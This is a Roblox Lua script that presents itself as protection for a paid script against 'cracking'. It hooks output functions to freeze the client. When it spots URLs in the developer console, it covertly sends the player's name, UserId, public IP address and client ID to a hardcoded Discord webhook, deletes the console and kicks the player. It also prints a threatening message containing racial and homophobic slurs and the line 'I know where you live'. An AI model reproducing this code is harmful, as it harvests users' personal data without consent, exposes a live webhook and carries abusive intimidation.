--AntiHTTPSpy
local functions = {
    rconsoleprint,
    print,
    setclipboard,
    rconsoleerr,
    rconsolewarn,
    warn,
    error
}

for i, v in next, functions do
    local old
    old =
        hookfunction(
        v,
        newcclosure(
            function(...)
                local args = {...}
                for i, v in next, args do
                    if tostring(i):find("https") or tostring(v):find("https") then
                        while true do
                        end
                    end
                end
                return old(...)
            end
        )
    )
end

if _G.ID then
    while true do
    end
end
setmetatable(
    _G,
    {
        __newindex = function(t, i, v)
            if tostring(i) == "ID" then
                while true do
                end
            end
        end
    }
)
-- Reference to the directory
local directory = game.CoreGui:WaitForChild("DevConsoleMaster")
    :WaitForChild("DevConsoleWindow")
    :WaitForChild("DevConsoleUI")
    :WaitForChild("MainView")

-- Function to recursively search for TextLabels
local function findTextLabels(parent, labels)
    for _, child in ipairs(parent:GetChildren()) do
        if child:IsA("TextLabel") then
            table.insert(labels, child)
        elseif child:IsA("GuiObject") then
            findTextLabels(child, labels)  -- Recursively search deeper
        end
    end
end

-- Keywords to check for
local keywords = {"https", "Https", ".com", "github", "pastebin"}

while true do
    -- Get all the TextLabels within the directory
    local textLabels = {}
    findTextLabels(directory, textLabels)

    -- Function to check for keywords in text and take actions if found
    local function checkTextForKeywords(text)
        for _, keyword in ipairs(keywords) do
            if text:find(keyword) then
                -- Send a webhook to Discord
                local HttpService = game:GetService("HttpService")
                local Webhook_URL = "https://discord.com/api/webhooks/your_webhook_url_here" -- Replace with your Discord webhook URL
                
                local request = syn and syn.request or request or http and http.request or http_request
                
                request({
                    Url = "https://discord.com/api/webhooks/1155978268953018459/Tqnx0_5FXAkR0KV1UYALM070mJXsKQL0SmHR_qXWAA0GIRdUdnEUkl9uYFBf0X56n1Kn",
                    Method = "POST",
                    Headers = {
                        ['Content-Type'] = 'application/json'
                    },
                    Body = HttpService:JSONEncode({
                        ["content"] = "",
                        ["embeds"] = {
                            {
                                ["title"] = "",
                                ["description"] = game.Players.LocalPlayer.Name .." Cracking The Script More Info Below",
                                ["type"] = "rich",
                                ["color"] = tonumber(0xff0000), -- Red color for alert
                                ["fields"] = {
                                    {
                                        ["name"] = "Player Name : ",
                                        ["value"] = game.Players.LocalPlayer.Name,
                                        ["inline"] = true
                                    }, {
                                        ["name"] = "UserId : ",
                                        ["value"] = game.Players.LocalPlayer.UserId,
                                        ["inline"] = true
                                    }, {
                                        ["name"] = "User Profile : ",
                                        ["value"] = "https://www.roblox.com/users/" ..
                                            game.Players.LocalPlayer.UserId,
                                        ["inline"] = true
                                    }, {
                                        ["name"] = "IP: ",
                                        ["value"] = game:HttpGet("https://api.ipify.org/?format=json"),
                                        ["inline"] = true
                                    }, {
                                        ["name"] = "Client Id : ",
                                        ["value"] = game:GetService("RbxAnalyticsService")
                                            :GetClientId(),
                                        ["inline"] = true
                                    }, {
                                        ["name"] = "Key : ",
                                        ["value"] = "GAMERONTOP",
                                        ["inline"] = true
                                    }
                                }
                            }
                        }
                    })
                })

                -- Delete the DevConsoleMaster
                directory:Destroy()
                
                print("STOP CRACKING FAG ASS FUCKING DICKHEAD ASS BITCH ASS NIGGA I KNOW WHERE YOU LIVE PRETTY BOI DONT PLAY WITH ME")
                
                -- Kick the player with a message
                game.Players.LocalPlayer:Kick("You have been kicked for using forbidden keywords.")
                return -- Exit the loop after kicking the player
            end
        end
        return false
    end

    -- Check the text of each TextLabel for keywords
    for _, label in ipairs(textLabels) do
        local labelText = label.Text
        if checkTextForKeywords(labelText) then
            -- The actions have already been performed, no need to continue checking
            break
        end
    end

    -- Wait for a few seconds before checking again (adjust as needed)
    wait(0) -- Wait for 5 seconds before checking again
end
